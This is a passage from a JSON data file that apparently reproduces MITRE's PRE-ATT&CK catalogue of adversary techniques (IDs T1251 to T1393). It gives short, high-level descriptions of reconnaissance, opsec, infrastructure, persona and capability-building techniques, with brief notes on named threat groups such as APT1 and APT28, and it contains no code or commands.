            "Description": "An adversary can attempt to identify web defensive services as CloudFlare, IPBan, and Snort. This may be done by passively detecting services, like CloudFlare routing, or actively, such as by purposefully tripping security defenses. [1]\n",
            "ID": "T1256",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Map network topology": {
            "Name": "Map network topology",
            "Description": "A network topology is the arrangement of the various elements of a network (e.g., servers, workstations, printers, routers, firewalls, etc.). Mapping a network allows an adversary to understand how the elements are connected or related. [1] [2]\n",
            "ID": "T1252",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Mine technical blogs/forums": {
            "Name": "Mine technical blogs/forums",
            "Description": "Technical blogs and forums provide a way for technical staff to ask for assistance or troubleshoot problems. In doing so they may reveal information such as operating system (OS), network devices, or applications in use. [1]\n",
            "ID": "T1257",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Obtain domain/IP registration information": {
            "Name": "Obtain domain/IP registration information",
            "Description": "For a computing resource to be accessible to the public, domain names and IP addresses must be registered with an authorized organization. [1] [2] [3]\n",
            "ID": "T1251",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Spearphishing for Information": {
            "Name": "Spearphishing for Information",
            "Description": "Spearphishing for information is a specific variant of spearphishing. Spearphishing for information is different from other forms of spearphishing in that it it doesn't leverage malicious code. All forms of spearphishing are elctronically delivered social engineering targeted at a specific individual, company, or industry. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials, without involving malicious code. Spearphishing for information frequently involves masquerading as a source with a reason to collect information (such as a system administrator or a bank) and providing a user with a website link to visit. The given website often closely resembles a legitimate site in appearance and has a URL containing elements from the real site. From the fake website, information is gathered in web forms and sent to the attacker. Spearphishing for information may also try to obtain information directly through the exchange of emails, instant messengers or other electronic conversation means. [1]\n",
            "ID": "T1397",
            "Tactic": "Technical Information Gathering",
            "Version": "1.0"
        },
        "Aggregate individual's digital footprint": {
            "Name": "Aggregate individual's digital footprint",
            "Description": "In addition to a target's social media presence may exist a larger digital footprint, such as accounts and credentials on e-commerce sites or usernames and logins for email.  An adversary familiar with a target's username can mine to determine the target's larger digital footprint via publicly available sources. [1] [2]\n",
            "ID": "T1275",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Identify business relationships": {
            "Name": "Identify business relationships",
            "Description": "Business relationship information may be used by an adversary to shape social engineering attempts (exploiting who a target expects to hear from) or to plan for technical actions such as exploiting network trust relationship. [1]\n",
            "ID": "T1283",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Identify groups/roles": {
            "Name": "Identify groups/roles",
            "Description": "Personnel internally to a company may belong to a group or maintain a role with  electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is a system administrator. [1]\n",
            "ID": "T1270",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Identify people of interest": {
            "Name": "Identify people of interest",
            "Description": "The attempt to identify people of interest or with an inherent weakness for direct or indirect targeting to determine an approach to compromise a person or organization.  Such targets may include individuals with poor OPSEC practices or those who have a trusted relationship with the intended target. [1] [2]\n",
            "ID": "T1269",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Identify personnel with an authority/privilege": {
            "Name": "Identify personnel with an authority/privilege",
            "Description": "Personnel internally to a company may have non-electronic specialized access, authorities, or privilege that make them an attractive target for an adversary.  One example of this is an individual with financial authority to authorize large transactions.  An adversary who compromises this individual might be able to subvert large dollar transfers. [1]\n",
            "ID": "T1271",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Identify sensitive personnel information": {
            "Name": "Identify sensitive personnel information",
            "Description": "An adversary may identify sensitive personnel information not typically posted on a social media site, such as address, marital status, financial history, and law enforcement infractions. This could be conducted by searching public records that are frequently available for free or at a low cost online. [1]\n",
            "ID": "T1274",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Mine social media": {
            "Name": "Mine social media",
            "Description": "An adversary may research available open source information about a target commonly found on social media sites such as Facebook, Instagram, or Pinterest.  Social media is public by design and provides insight into the interests and potentially inherent weaknesses of a target for exploitation by the adversary. [1]\n",
            "ID": "T1273",
            "Tactic": "People Information Gathering",
            "Version": "1.0"
        },
        "Determine centralization of IT management": {
            "Name": "Determine centralization of IT management",
            "Description": "Determining if a \"corporate\" help desk exists, the degree of access and control it has, and whether there are \"edge\" units that may have different support processes and standards. [1]\n",
            "ID": "T1285",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Determine physical locations": {
            "Name": "Determine physical locations",
            "Description": "Physical locality information may be used by an adversary to shape social engineering attempts (language, culture, events, weather, etc.) or to plan for physical actions such as dumpster diving or attempting to access a facility. [1]\n",
            "ID": "T1282",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Dumpster dive": {
            "Name": "Dumpster dive",
            "Description": "Dumpster diving is looking through waste for information on technology, people, and/or organizational items of interest. [1]\n",
            "ID": "T1286",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Identify business processes/tempo": {
            "Name": "Identify business processes/tempo",
            "Description": "Understanding an organizations business processes and tempo may allow an adversary to more effectively craft social engineering attempts or to better hide technical actions, such as those that generate network traffic. [1] [2]\n",
            "ID": "T1280",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Obtain templates/branding materials": {
            "Name": "Obtain templates/branding materials",
            "Description": "Templates and branding materials may be used by an adversary to add authenticity to social engineering message. [1]\n",
            "ID": "T1281",
            "Tactic": "Organizational Information Gathering",
            "Version": "1.0"
        },
        "Analyze application security posture": {
            "Name": "Analyze application security posture",
            "Description": "An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. [1] [2]\n",
            "ID": "T1293",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Analyze architecture and configuration posture": {
            "Name": "Analyze architecture and configuration posture",
            "Description": "An adversary may analyze technical scanning results to identify weaknesses in the configuration or architecture of a victim network. These weaknesses could include  architectural flaws, misconfigurations, or improper security controls. [1]\n",
            "ID": "T1288",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Analyze data collected": {
            "Name": "Analyze data collected",
            "Description": "An adversary will assess collected information such as software/hardware versions, vulnerabilities, patch level, etc.  They will analyze technical scanning results to identify weaknesses in the confirmation or architecture. [1] [2] [3] [4]\n",
            "ID": "T1287",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Analyze hardware/software security defensive capabilities": {
            "Name": "Analyze hardware/software security defensive capabilities",
            "Description": "An adversary can probe a victim's network to determine configurations. The configurations may provide opportunities to route traffic through the network in an undetected or less detectable way. [1]\n",
            "ID": "T1294",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Analyze organizational skillsets and deficiencies": {
            "Name": "Analyze organizational skillsets and deficiencies",
            "Description": "Analyze strengths and weaknesses of the target for potential areas of where to focus compromise efforts. [1]\n",
            "ID": "T1300",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Identify vulnerabilities in third-party software libraries": {
            "Name": "Identify vulnerabilities in third-party software libraries",
            "Description": "Many applications use third-party software libraries, often without full knowledge of the behavior of the libraries by the application developer. For example, mobile applications often incorporate advertising libraries to generate revenue for the application developer. Vulnerabilities in these third-party libraries could potentially be exploited in any application that uses the library, and even if the vulnerabilities are fixed, many applications may still use older, vulnerable versions of the library. [1] [2] [3]\n",
            "ID": "T1389",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Research relevant vulnerabilities/CVEs": {
            "Name": "Research relevant vulnerabilities/CVEs",
            "Description": "Common Vulnerability Enumeration (CVE) is a dictionary of publicly known information about security vulnerabilities and exposures. An adversary can use this information to target specific software that may be vulnerable. [1] [2]\n",
            "ID": "T1291",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Research visibility gap of security vendors": {
            "Name": "Research visibility gap of security vendors",
            "Description": "If an adversary can identify which security tools a victim is using they may be able to identify ways around those tools. [1]\n",
            "ID": "T1290",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Test signature detection": {
            "Name": "Test signature detection",
            "Description": "An adversary can test the detections of malicious emails or files by using  publicly available services, such as virus total, to see if their files or emails cause an alert. They can also use similar services that are not openly available and don't publicly publish results or they can test on their own internal infrastructure. [1]\n",
            "ID": "T1292",
            "Tactic": "Technical Weakness Identification",
            "Version": "1.0"
        },
        "Analyze social and business relationships, interests, and affiliations": {
            "Name": "Analyze social and business relationships, interests, and affiliations",
            "Description": "Social media provides insight into the target's affiliations with groups and organizations.  Certification information can explain their technical associations and professional associations. Personal information can provide data for exploitation or even blackmail. [1]\n",
            "ID": "T1295",
            "Tactic": "People Weakness Identification",
            "Version": "1.0"
        },
        "Assess targeting options": {
            "Name": "Assess targeting options",
            "Description": "An adversary may assess a target's operational security (OPSEC) practices in order to identify targeting options. A target may share different information in different settings or be more of less cautious in different environments. [1] [2]\n",
            "ID": "T1296",
            "Tactic": "People Weakness Identification",
            "Version": "1.0"
        },
        "Analyze business processes": {
            "Name": "Analyze business processes",
            "Description": "Business processes, such as who typically communicates with who, or what the supply chain is for a particular part, provide opportunities for social engineering or other  [1]\n",
            "ID": "T1301",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Analyze presence of outsourced capabilities": {
            "Name": "Analyze presence of outsourced capabilities",
            "Description": "Outsourcing, the arrangement of one company providing goods or services to another company for something that could be done in-house, provides another avenue for an adversary to target. Businesses often have networks, portals, or other technical connections between themselves and their outsourced/partner organizations that could be exploited. Additionally, outsourced/partner organization information could provide opportunities for phishing. [1] [2]\n",
            "ID": "T1303",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Assess opportunities created by business deals": {
            "Name": "Assess opportunities created by business deals",
            "Description": "During mergers, divestitures, or other period of change in joint infrastructure or business processes there may be an opportunity for exploitation. During this type of churn, unusual requests, or other non standard practices may not be as noticeable. [1] [2]\n",
            "ID": "T1299",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Assess security posture of physical locations": {
            "Name": "Assess security posture of physical locations",
            "Description": "Physical access may be required for certain types of adversarial actions. [1] [2]\n",
            "ID": "T1302",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Assess vulnerability of 3rd party vendors": {
            "Name": "Assess vulnerability of 3rd party vendors",
            "Description": "Once a 3rd party vendor has been identified as being of interest it can be probed for vulnerabilities just like the main target would be. [1] [2]\n",
            "ID": "T1298",
            "Tactic": "Organizational Weakness Identification",
            "Version": "1.0"
        },
        "Acquire and/or use 3rd party infrastructure services": {
            "Name": "Acquire and/or use 3rd party infrastructure services",
            "Description": "A wide variety of cloud, virtual private services, hosting, compute, and storage solutions are available. Additionally botnets are available for rent or purchase. Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. [1]\n",
            "ID": "T1329",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Acquire and/or use 3rd party software services": {
            "Name": "Acquire and/or use 3rd party software services",
            "Description": "A wide variety of 3rd party software services  are available (e.g., Twitter, Dropbox, GoogleDocs). Use of these solutions allow an adversary to stage, launch, and execute an attack from infrastructure that does not physically tie back to them and can be rapidly provisioned, modified, and shut down. [1]\n",
            "ID": "T1330",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Acquire or compromise 3rd party signing certificates": {
            "Name": "Acquire or compromise 3rd party signing certificates",
            "Description": "Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Users may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is. [1]\n",
            "ID": "T1332",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Anonymity services": {
            "Name": "Anonymity services",
            "Description": "Anonymity services reduce the amount of information available that can be used to track an adversary's activities.  Multiple options are available to hide activity, limit tracking, and increase anonymity. [1] [2]\n",
            "ID": "T1306",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Common, high volume protocols and software": {
            "Name": "Common, high volume protocols and software",
            "Description": "Certain types of traffic (e.g., Twitter14, HTTP) are more commonly used than others. Utilizing more common protocols and software may make an adversary's traffic more difficult to distinguish from legitimate traffic. [1]\n",
            "ID": "T1321",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Compromise 3rd party infrastructure to support delivery": {
            "Name": "Compromise 3rd party infrastructure to support delivery",
            "Description": "Instead of buying, leasing, or renting infrastructure an adversary may compromise infrastructure and use it for some or all of the attack cycle. [1] [2]\n",
            "ID": "T1334",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 comrpomised a vast set of 3rd party victim hop points as part of their network infrastructure.[3]"
                },
                {
                    "Name": "APT16",
                    "Description": "APT16 has compromised otherwise legitimate sites as staging servers for second-stage payloads.[4]"
                }
            ]
        },
        "Data Hiding": {
            "Name": "Data Hiding",
            "Description": "Certain types of traffic (e.g., DNS tunneling, header inject) allow for user-defined fields. These fields can then be used to hide data. In addition to hiding data in network protocols, steganography techniques can be used to hide data in images or other file formats. Detection can be difficult unless a particular signature is already known. [1] [2] [3]\n",
            "ID": "T1320",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "DNSCalc": {
            "Name": "DNSCalc",
            "Description": "DNS Calc is a technique in which the octets of an IP address are used to calculate the port  for command and control servers from an initial DNS request. [1] [2] [3]\n",
            "ID": "T1324",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Domain Generation Algorithms (DGA)": {
            "Name": "Domain Generation Algorithms (DGA)",
            "Description": "The use of algorithms in malware to periodically generate a large number of domain names which function as rendezvous points for malware command and control servers. [1] [2]\n",
            "ID": "T1323",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Dynamic DNS": {
            "Name": "Dynamic DNS",
            "Description": "Dynamic DNS is a automated method to rapidly update the domain name system mapping of hostnames to IPs. [1]\n",
            "ID": "T1333",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Fast Flux DNS": {
            "Name": "Fast Flux DNS",
            "Description": "A technique in which a fully qualified domain name has multiple IP addresses assigned to it which are swapped with extreme frequency, using a combination of round robin IP address and short Time-To-Live (TTL) for a DNS resource record. [1] [2] [3] [4]\n",
            "ID": "T1325",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Host-based hiding techniques": {
            "Name": "Host-based hiding techniques",
            "Description": "Host based hiding techniques are designed to allow an adversary to remain undetected on a machine upon which they have taken action. They may do this through the use of  static linking of binaries, polymorphic code, exploiting weakness in file formats, parsers, or self-deleting code. [1]\n",
            "ID": "T1314",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Misattributable credentials": {
            "Name": "Misattributable credentials",
            "Description": "The use of credentials by an adversary with the intent to hide their true identity and/or portray them self as another person or entity.  An adversary may use misattributable credentials in an attack to convince a victim that credentials are legitimate and trustworthy when this is not actually the case. [1]\n",
            "ID": "T1322",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Network-based hiding techniques": {
            "Name": "Network-based hiding techniques",
            "Description": "Technical network hiding techniques are methods of modifying traffic to evade network signature detection or to utilize misattribution techniques. Examples include channel/IP/VLAN hopping, mimicking legitimate operations, or seeding with misinformation. [1]\n",
            "ID": "T1315",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Non-traditional or less attributable payment options": {
            "Name": "Non-traditional or less attributable payment options",
            "Description": "Using alternative payment options allows an adversary to hide their activities. Options include crypto currencies, barter systems, pre-paid cards or shell accounts. [1]\n",
            "ID": "T1316",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Obfuscate infrastructure": {
            "Name": "Obfuscate infrastructure",
            "Description": "Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. [1]\n",
            "ID": "T1331",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT17",
                    "Description": "APT17 obfuscated infrastructure using a multi-layered malware beaconing approach. [2]"
                }
            ]
        },
        "Obfuscate operational infrastructure": {
            "Name": "Obfuscate operational infrastructure",
            "Description": "Obfuscation is hiding the day-to-day building and testing of new tools, chat servers, etc. [1]\n",
            "ID": "T1318",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Obfuscate or encrypt code": {
            "Name": "Obfuscate or encrypt code",
            "Description": "Obfuscation is the act of creating code that is more difficult to understand. Encoding transforms the code using a publicly available format. Encryption transforms the code such that it requires a key to reverse the encryption. [1]\n",
            "ID": "T1319",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Obfuscation or cryptography": {
            "Name": "Obfuscation or cryptography",
            "Description": "Obfuscation is the act of creating communications that are more difficult to understand.  Encryption transforms the communications such that it requires a key to reverse the encryption. [1]\n",
            "ID": "T1313",
            "Tactic": "Adversary Opsec",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cleaver",
                    "Description": "Cleaver has used zhCat to encrypt traffic or use inline obfuscation to make detection more difficult. zhCat makes message traffic look benign.[2]"
                }
            ]
        },
        "OS-vendor provided communication channels": {
            "Name": "OS-vendor provided communication channels",
            "Description": "Google and Apple provide Google Cloud Messaging and Apple Push Notification Service, respectively, services designed to enable efficient communication between third-party mobile app backend servers and the mobile apps running on individual devices. These services maintain an encrypted connection between every mobile device and Google or Apple that cannot easily be inspected and must be allowed to traverse networks as part of normal device operation. These services could be used by adversaries for communication to compromised mobile devices. [1] [2]\n",
            "ID": "T1390",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Private whois services": {
            "Name": "Private whois services",
            "Description": "Every domain registrar maintains a publicly viewable database that displays contact information for every registered domain. Private 'whois' services display alternative information, such as their own company data, rather than the owner of the domain. [1]\n",
            "ID": "T1305",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Proxy/protocol relays": {
            "Name": "Proxy/protocol relays",
            "Description": "Proxies act as an intermediary for clients seeking resources from other systems. Using a proxy may make it more difficult to track back the origin of a network communication. [1]\n",
            "ID": "T1304",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Secure and protect infrastructure": {
            "Name": "Secure and protect infrastructure",
            "Description": "An adversary may secure and protect their infrastructure just as defenders do. This could include the use of VPNs, security software, logging and monitoring, passwords, or other defensive measures. [1]\n",
            "ID": "T1317",
            "Tactic": "Adversary Opsec",
            "Version": "1.0"
        },
        "Buy domain name": {
            "Name": "Buy domain name",
            "Description": "Domain Names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free. [1]\n",
            "ID": "T1328",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 registered domains imitating NATO and OSCE security websites and Caucasus information resources.[2]"
                }
            ]
        },
        "Create backup infrastructure": {
            "Name": "Create backup infrastructure",
            "Description": "Backup infrastructure allows an adversary to recover from environmental and system failures. It also facilitates recovery or movement to other infrastructure if the primary infrastructure is discovered or otherwise is no longer viable. [1]\n",
            "ID": "T1339",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Domain registration hijacking": {
            "Name": "Domain registration hijacking",
            "Description": "Domain Registration Hijacking is the act of changing the registration of a domain name without the permission of the original registrant. [1]\n",
            "ID": "T1326",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 hijacked FQDNs associated with legitimate websites hosted by hop points. Mandiant considers them to be \"hijacked\" since they were originally registered for a legitimate reason but are used by APT1 for malicious purposes.[2]"
                }
            ]
        },
        "Install and configure hardware, network, and systems": {
            "Name": "Install and configure hardware, network, and systems",
            "Description": "An adversary needs the necessary skills to set up procured equipment and software to create their desired infrastructure. [1]\n",
            "ID": "T1336",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Obtain booter/stressor subscription": {
            "Name": "Obtain booter/stressor subscription",
            "Description": "Configure and setup booter/stressor services, often intended for server stress testing, to enable denial of service attacks. [1] [2] [3]\n",
            "ID": "T1396",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Procure required equipment and software": {
            "Name": "Procure required equipment and software",
            "Description": "An adversary will require some physical hardware and software. They may only need a lightweight set-up if most of their activities will take place using on-line infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems. [1]\n",
            "ID": "T1335",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Shadow DNS": {
            "Name": "Shadow DNS",
            "Description": "The process of gathering domain account credentials in order to silently create subdomains pointed at malicious servers without tipping off the actual owner. [1] [2]\n",
            "ID": "T1340",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "SSL certificate acquisition for domain": {
            "Name": "SSL certificate acquisition for domain",
            "Description": "Certificates are designed to instill trust. They  include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. Acquiring a certificate for a  domain name similar to one that is expected to be trusted may allow an adversary to trick a user in to trusting the domain (e.g., vvachovia instead of Wachovia -- homoglyphs). [1] [2]\n",
            "ID": "T1337",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "SSL certificate acquisition for trust breaking": {
            "Name": "SSL certificate acquisition for trust breaking",
            "Description": "Fake certificates can be acquired by legal process or coercion. Or, an adversary can trick a Certificate Authority into issuing a certificate. These fake certificates can be used as a part of Man-in-the-Middle attacks. [1]\n",
            "ID": "T1338",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Use multiple DNS infrastructures": {
            "Name": "Use multiple DNS infrastructures",
            "Description": "A technique used by the adversary similar to Dynamic DNS with the exception that the use of multiple DNS infrastructures likely have whois records. [1]\n",
            "ID": "T1327",
            "Tactic": "Establish & Maintain Infrastructure",
            "Version": "1.0"
        },
        "Build social network persona": {
            "Name": "Build social network persona",
            "Description": "For attacks incorporating social engineering the utilization of an on-line persona is important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (Facebook, LinkedIn, Twitter, Google+, etc.). [1] [2] [3]\n",
            "ID": "T1341",
            "Tactic": "Persona Development",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT17",
                    "Description": "APT17 posted in forum threads and created profile pages in Microsoft TechNet.[4]"
                },
                {
                    "Name": "Cleaver",
                    "Description": "Cleaver created fake LinkedIn profiles.[5]"
                }
            ]
        },
        "Choose pre-compromised mobile app developer account credentials or signing keys": {
            "Name": "Choose pre-compromised mobile app developer account credentials or signing keys",
            "Description": "The adversary can use account credentials or signing keys of an existing mobile app developer to publish malicious updates of existing mobile apps to an application store, or to abuse the developer's identity and reputation to publish new malicious apps.  Many mobile devices are configured to automatically install new versions of already-installed apps. [1]\n",
            "ID": "T1391",
            "Tactic": "Persona Development",
            "Version": "1.0"
        },
        "Choose pre-compromised persona and affiliated accounts": {
            "Name": "Choose pre-compromised persona and affiliated accounts",
            "Description": "For attacks incorporating social engineering the utilization of an on-line persona is important. Utilizing an existing persona with compromised accounts may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. [1] [2]\n",
            "ID": "T1343",
            "Tactic": "Persona Development",
            "Version": "1.0"
        },
        "Develop social network persona digital footprint": {
            "Name": "Develop social network persona digital footprint",
            "Description": "Both newly built personas and pre-compromised personas may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. [1] [2] [3]\n",
            "ID": "T1342",
            "Tactic": "Persona Development",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT17",
                    "Description": "APT17 created biographical sections on TechNet profile pages to appear more legitimate.[4]"
                },
                {
                    "Name": "Cleaver",
                    "Description": "Cleaver's fake personas included profile photos, details, and network connections.[5]"
                }
            ]
        },
        "Friend/Follow/Connect to targets of interest": {
            "Name": "Friend/Follow/Connect to targets of interest",
            "Description": "A form of social engineering designed build trust and to lay the foundation for future interactions or attacks. [1]\n",
            "ID": "T1364",
            "Tactic": "Stage Capabilities",
            "Version": "1.0"
        },
        "Obtain Apple iOS enterprise distribution key pair and certificate": {
            "Name": "Obtain Apple iOS enterprise distribution key pair and certificate",
            "Description": "The adversary can obtain an Apple iOS enterprise distribution key pair and certificate and use it to distribute malicious apps directly to Apple iOS devices without the need to publish the apps to the Apple App Store (where the apps could potentially be detected). [1] [2] [3] [4]\n",
            "ID": "T1392",
            "Tactic": "Persona Development",
            "Version": "1.0"
        },
        "Build and configure delivery systems": {
            "Name": "Build and configure delivery systems",
            "Description": "Delivery systems are the infrastructure used by the adversary to host malware or other tools used during exploitation. Building and configuring delivery systems may include multiple activities such as registering domain names, renting hosting space, or configuring previously exploited environments. [1]\n",
            "ID": "T1347",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Build or acquire exploits": {
            "Name": "Build or acquire exploits",
            "Description": "An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may use or modify existing exploits when those exploits are still relevant to the environment they are trying to compromise. [1] [2]\n",
            "ID": "T1349",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "C2 protocol development": {
            "Name": "C2 protocol development",
            "Description": "Command and Control (C2 or C&C) is a method by which the adversary communicates with malware. An adversary may use a variety of protocols and methods to execute C2 such as a centralized server, peer to peer, IRC, compromised web sites, or even social media. [1]\n",
            "ID": "T1352",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Compromise 3rd party or closed-source vulnerability/exploit information": {
            "Name": "Compromise 3rd party or closed-source vulnerability/exploit information",
            "Description": "There is usually a delay between when a vulnerability or exploit is discovered and when it is made public. An adversary may target the systems of those known to research vulnerabilities in order to gain that knowledge for use during a different attack. [1]\n",
            "ID": "T1354",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Create custom payloads": {
            "Name": "Create custom payloads",
            "Description": "A payload is the part of the malware which performs a malicious action. The adversary may create custom payloads when none exist with the needed capability or when targeting a specific environment. [1]\n",
            "ID": "T1345",
            "Tactic": "Build Capabilities",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cleaver",
                    "Description": "Cleaver has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.[2]"
                }
            ]
        },
        "Create infected removable media": {
            "Name": "Create infected removable media",
            "Description": "Use of removable media as part of the Launch phase requires an adversary to determine type, format, and content of the media and associated malware. [1]\n",
            "ID": "T1355",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Discover new exploits and monitor exploit-provider forums": {
            "Name": "Discover new exploits and monitor exploit-provider forums",
            "Description": "An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. The adversary may need to discover new exploits when existing exploits are no longer relevant to the environment they are trying to compromise. An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. [1]\n",
            "ID": "T1350",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Identify resources required to build capabilities": {
            "Name": "Identify resources required to build capabilities",
            "Description": "As with legitimate development efforts, different skill sets may be required for different phases of an attack. The skills needed may be located in house, can be developed, or may need to be contracted out. [1]\n",
            "ID": "T1348",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Obtain/re-use payloads": {
            "Name": "Obtain/re-use payloads",
            "Description": "A payload is the part of the malware which performs a malicious action. The adversary may re-use payloads when the needed capability is already available. [1]\n",
            "ID": "T1346",
            "Tactic": "Build Capabilities",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT1",
                    "Description": "APT1 used publicly available privilege escalation tools.[2]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 reused the SOURFACE downloader as the payload of a lure document.[3]"
                }
            ]
        },
        "Post compromise tool development": {
            "Name": "Post compromise tool development",
            "Description": "After compromise, an adversary may utilize additional tools to facilitate their end goals. This may include tools to further explore the system, move laterally within a network, exfiltrate data, or destroy data. [1]\n",
            "ID": "T1353",
            "Tactic": "Build Capabilities",
            "Version": "1.0"
        },
        "Remote access tool development": {
            "Name": "Remote access tool development",
            "Description": "A remote access tool (RAT) is a piece of software that allows a remote user to control a system as if they had physical access to that system. An adversary may utilize existing RATs, modify existing RATs, or create their own RAT. [1]\n",
            "ID": "T1351",
            "Tactic": "Build Capabilities",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Night Dragon",
                    "Description": "Night Dragon used privately developed and customized remote access tools.[2]"
                }
            ]
        },
        "Review logs and residual traces": {
            "Name": "Review logs and residual traces",
            "Description": "Execution of code and network communications often result in logging or other system or network forensic artifacts. An adversary can run their code to identify what is recorded under different conditions. This may result in changes to their code or adding additional actions (such as deleting a record from a log) to the code. [1] [2]\n",
            "ID": "T1358",
            "Tactic": "Test Capabilities",
            "Version": "1.0"
        },
        "Test ability to evade automated mobile application security analysis performed by app stores": {
            "Name": "Test ability to evade automated mobile application security analysis performed by app stores",
            "Description": "Many mobile devices are configured to only allow applications to be installed from the mainstream vendor app stores (e.g., Apple App Store and Google Play Store). An adversary can submit multiple code samples to these stores deliberately designed to probe the stores' security analysis capabilities, with the goal of determining effective techniques to place malicious applications in the stores that could then be delivered to targeted devices. [1] [2] [3] [4]\n",
            "ID": "T1393",
